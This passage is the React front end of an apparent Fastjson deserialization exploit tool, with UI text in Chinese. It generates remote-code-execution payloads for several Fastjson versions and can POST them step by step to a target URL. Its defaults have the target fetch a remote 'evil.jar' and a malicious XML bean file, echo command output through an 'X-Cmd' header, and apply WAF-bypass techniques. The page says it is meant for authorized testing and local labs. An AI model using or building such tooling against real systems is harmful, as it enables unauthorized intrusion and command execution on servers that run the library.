  const [socketFactoryArg, setSocketFactoryArg] = useState(
    "http://127.0.0.1:18080/attack/bean-postgresql.xml",
  );
  const [classpath, setClasspath] = useState(
    "http://127.0.0.1:18080/attack/evil.jar",
  );
  const [wrapCurrency, setWrapCurrency] = useState("false");
  const [currencyField, setCurrencyField] = useState("currency");
  const [echo, setEcho] = useState("false");
  const [engine, setEngine] = useState<EchoEngine>("auto");
  const [cmd, setCmd] = useState("id");
  const [cmdHeader, setCmdHeader] = useState("X-Cmd");
  const [target, setTarget] = useState("http://127.0.0.1:18280/api/fastjson");
  const [send, setSend] = useState("false");
  const [resetCache, setResetCache] = useState("true");
  const [waf, setWaf] = useState<WafControlValue>(emptyWafControlValue);
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<Poc1280Result | null>(null);

  useEffect(() => {
    listPoc1280Gadgets()
      .then(setGadgets)
      .catch((err) => {
        const msg = err instanceof Error ? err.message : String(err);
        toast.error(msg);
      });
  }, []);

  const current = gadgets.find((g) => g.id === gadget);
  const fields = new Set(current?.input_fields ?? []);

  async function onGenerate(doSend: boolean) {
    setLoading(true);
    setResult(null);
    try {
      const data = await runPoc1280({
        gadget,
        file: file.trim() || null,
        content: content.trim() || null,
        url: url.trim() || null,
        host: host.trim() || null,
        port: port ? Number(port) : null,
        socket_factory_arg: socketFactoryArg.trim() || null,
        classpath: classpath.trim() || null,
        wrap_currency: wrapCurrency === "true",
        currency_field: currencyField,
        echo: echo === "true",
        engine,
        cmd: cmd.trim() || "id",
        cmd_header: cmdHeader.trim() || "X-Cmd",
        waf_techniques: waf.techniques,
        waf_options: waf.techniques.length ? waf.options : undefined,
        target: target.trim(),
        send: doSend,
        reset_cache: resetCache === "true",
      });
      setResult(data);
      if (data.ok) {
        if (data.echo_output) toast.success("回显成功");
        else toast.success(doSend ? "已按步发送" : "已生成");
      } else toast.error(data.summary || "失败");
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      toast.error(msg);
    } finally {
      setLoading(false);
    }
  }

  async function onCopy() {
    const text =
      result?.steps && result.steps.length > 1
        ? result.steps.map((s, i) => `// step ${i + 1}\n${s}`).join("\n\n")
        : result?.payload;
    if (!text) return;
    try {
      await navigator.clipboard.writeText(text);
      toast.success("已复制 payload");
    } catch {
      toast.error("复制失败");
    }
  }

  return (
    <div className="grid items-start gap-6 lg:grid-cols-[minmax(0,1.1fr)_minmax(0,0.9fr)]">
      <Card className="min-w-0 lg:sticky lg:top-4">
        <CardHeader>
          <CardTitle>生成参数</CardTitle>
          <CardDescription>
            对接 <code>/api/poc/1.2.80</code>。一律以写文件证明 RCE；靶场{" "}
            <code>lab/fastjson-1280-lab</code> → <code>18280</code>。
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid gap-2">
            <Label>Gadget</Label>
            <Select value={gadget} onValueChange={setGadget}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                {gadgets.map((g) => (
                  <SelectItem key={g.id} value={g.id}>
                    {g.title}
                    {g.steps ? ` (${g.steps}步)` : ""}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {current ? (
              <p className="text-xs text-muted-foreground">{current.description}</p>
            ) : null}
          </div>

          {fields.has("file") ? (
            <div className="grid gap-2">
              <Label htmlFor="file-1280">目标文件</Label>
              <Input
                id="file-1280"
                value={file}
                onChange={(e) => setFile(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("content") ? (
            <div className="grid gap-2">
              <Label htmlFor="content-1280">写入内容</Label>
              <Textarea
                id="content-1280"
                className="min-h-20 font-mono text-xs"
                value={content}
                onChange={(e) => setContent(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("url") ? (
            <div className="grid gap-2">
              <Label htmlFor="url-1280">读文件 URL</Label>
              <Input
                id="url-1280"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("guess_byte") ? (
            <div className="grid gap-2">
              <Label htmlFor="guess-1280">猜测首字节 (0-255)</Label>
              <Input
                id="guess-1280"
                value={guessByte}
                onChange={(e) => setGuessByte(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("host") || fields.has("port") ? (
            <div className="grid gap-4 sm:grid-cols-2">
              <div className="grid gap-2">
                <Label>Host</Label>
                <Input value={host} onChange={(e) => setHost(e.target.value)} />
              </div>
              <div className="grid gap-2">
                <Label>Port</Label>
                <Input value={port} onChange={(e) => setPort(e.target.value)} />
              </div>
            </div>
          ) : null}

          {fields.has("socket_factory_arg") ? (
            <div className="grid gap-2">
              <Label>socketFactoryArg (XML URL)</Label>
              <Input
                value={socketFactoryArg}
                onChange={(e) => setSocketFactoryArg(e.target.value)}
              />
            </div>
          ) : null}

          {fields.has("classpath") ? (
            <div className="grid gap-2">
              <Label>groovy classpathList</Label>
              <Input
                value={classpath}
                onChange={(e) => setClasspath(e.target.value)}
              />
            </div>
          ) : null}

          {ECHO_1280.has(gadget) ? (
            <EchoFields
              echo={echo}
              setEcho={setEcho}
              engine={engine}
              setEngine={setEngine}
              cmd={cmd}
              setCmd={setCmd}
              cmdHeader={cmdHeader}
              setCmdHeader={setCmdHeader}
              hint="postgresql/jython：bean-echo.xml+echo.jar；groovy：evil-echo.jar。需可被目标拉取。"
            />
          ) : null}

          <CurrencyWrapControls
            wrap={wrapCurrency}
            onWrapChange={setWrapCurrency}
            field={currencyField}
            onFieldChange={setCurrencyField}
          />

          <div className="grid gap-4 sm:grid-cols-2">
            <div className="grid gap-2">
              <Label htmlFor="target-1280">目标 URL（可选发送）</Label>
              <Input
                id="target-1280"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
              />
            </div>
            <div className="grid gap-2">
              <Label>生成后发送</Label>
              <Select value={send} onValueChange={setSend}>
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="false">仅生成</SelectItem>
                  <SelectItem value="true">按步 POST</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          <div className="grid gap-2">
            <Label>发送前 reset 缓存</Label>
            <Select value={resetCache} onValueChange={setResetCache}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="true">调用 /api/reset</SelectItem>
                <SelectItem value="false">不重置</SelectItem>
              </SelectContent>
            </Select>
          </div>

          <WafControls value={waf} onChange={setWaf} />

          <Separator />
          <div className="flex flex-wrap gap-2">
            <Button
              onClick={() => onGenerate(send === "true")}
              disabled={loading}
            >
              {loading ? (
                <Loader2 className="size-4 animate-spin" />
              ) : send === "true" ? (
                <Play className="size-4" />
              ) : (
                <Wand2 className="size-4" />
              )}
              {send === "true" ? "生成并发送" : "生成 payload"}
            </Button>
            <Button
              variant="outline"
              onClick={onCopy}
              disabled={!result?.payload}
            >
              <Copy className="size-4" />
              复制
            </Button>
          </div>
        </CardContent>
      </Card>

      <div className="min-w-0 space-y-4">
        <Alert>
          <AlertTitle>1.2.80 RCE（写文件证明）</AlertTitle>
          <AlertDescription className="space-y-1 text-sm">
            <p>
              每条链最终必须写出 <code>/tmp/fj1280_*</code>。Exception
              expectClass + 反序列化器缓存后，经 io / PG-XML / Groovy-SPI /
              aspectj 等落盘。
            </p>
            <p>
              验证：<code>python tests/lab/lab_test_1280_gadgets.py</code>
            </p>
            {current ? (
              <p>
                依赖：{current.requires.join(" / ")}；JDK：{current.jdk}
              </p>
            ) : null}
          </AlertDescription>
        </Alert>

        {result ? (
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                {result.title || result.gadget}
                <Badge variant={result.ok ? "default" : "destructive"}>
                  {result.sent
                    ? `HTTP ${(result.status_codes ?? [result.status_code]).join(",")}`
                    : "已生成"}
                </Badge>
              </CardTitle>
              <CardDescription>{result.summary}</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              {result.waf_techniques && result.waf_techniques.length > 0 ? (
                <div className="flex flex-wrap gap-1">
                  {result.waf_techniques.map((t) => (
                    <Badge key={t} variant="secondary">
                      waf:{t}
                    </Badge>
                  ))}
                </div>
              ) : null}
              {(result.steps && result.steps.length > 0
                ? result.steps
                : [result.payload]
              ).map((step, i, arr) => (
                <div key={i} className="space-y-1">
                  {arr.length > 1 ? (
                    <p className="text-xs text-muted-foreground">
                      Step {i + 1}/{arr.length}
                    </p>
                  ) : null}
                  <Textarea
                    readOnly
                    className="min-h-40 font-mono text-xs"
                    value={step}
                  />
                </div>
              ))}
              {result.response_preview ? (
                <Textarea
                  readOnly
                  className="min-h-28 font-mono text-xs"
                  value={result.response_preview}
                />
              ) : null}
              {result.echo_output ? (
                <div className="grid gap-2">
                  <Label>回显输出</Label>
                  <Textarea
                    readOnly
                    className="min-h-28 font-mono text-xs"
                    value={result.echo_output}
                  />
                </div>
              ) : null}
            </CardContent>
          </Card>
        ) : null}
      </div>
    </div>
  );
}

export default function PocPage() {
  return (
    <main className="mx-auto flex w-full max-w-6xl flex-1 flex-col gap-6 px-6 py-8">
      <div className="space-y-2">
        <div className="flex flex-wrap items-center gap-2">
          <h1 className="text-2xl font-semibold tracking-tight">PoC</h1>
          <Badge variant="secondary">多版本</Badge>
        </div>
        <p className="max-w-3xl text-sm text-muted-foreground">
          证明用 payload / 运行器：≤1.2.47、≤1.2.68、≤1.2.80，以及 1.2.83
          CVE-2026-16723。仅授权测试与本地靶场。
        </p>
      </div>

      <Tabs defaultValue="1280">
        <TabsList>
          <TabsTrigger value="1247">≤1.2.47 缓存绕过</TabsTrigger>
          <TabsTrigger value="1268">≤1.2.68 AutoCloseable</TabsTrigger>
          <TabsTrigger value="1280">≤1.2.80 Exception</TabsTrigger>
          <TabsTrigger value="16723">1.2.83 CVE-2026-16723</TabsTrigger>
        </TabsList>
        <TabsContent value="1247" className="mt-6">
          <Poc1247Panel />
        </TabsContent>
        <TabsContent value="1268" className="mt-6">
          <Poc1268Panel />
        </TabsContent>
        <TabsContent value="1280" className="mt-6">
          <Poc1280Panel />
        </TabsContent>
        <TabsContent value="16723" className="mt-6">
          <Poc16723Panel />
        </TabsContent>
      </Tabs>
    </main>
  );
}
